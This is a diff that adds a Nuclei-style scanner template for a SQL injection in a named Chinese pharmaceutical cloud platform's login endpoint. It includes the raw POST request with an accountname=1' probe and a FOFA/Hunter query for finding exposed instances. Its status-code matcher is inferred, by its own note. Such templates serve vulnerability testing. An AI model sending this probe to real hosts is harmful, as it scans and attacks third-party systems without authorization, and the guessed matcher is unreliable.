@@ -1,0 +1,44 @@
+id: poc-41c7e7d8357f89a7baf9
+info:
+  name: 成都海翔软件有限公司海翔药业云平台存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/41c7e7d8357f89a7baf93bd803a09567
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 41c7e7d8357f89a7baf93bd803a09567
+    fofa: + hunter`web.title="登录海翔"`
+http:
+- raw:
+  - 'POST /getylist_login.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 13
+
+    Connection: close
+
+    Cookie: JSESSIONID=CC105C5EED7D5DE8BFCB92D7F4BB74DC; __session:0.5376174871119012:=http:
+
+
+    accountname=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
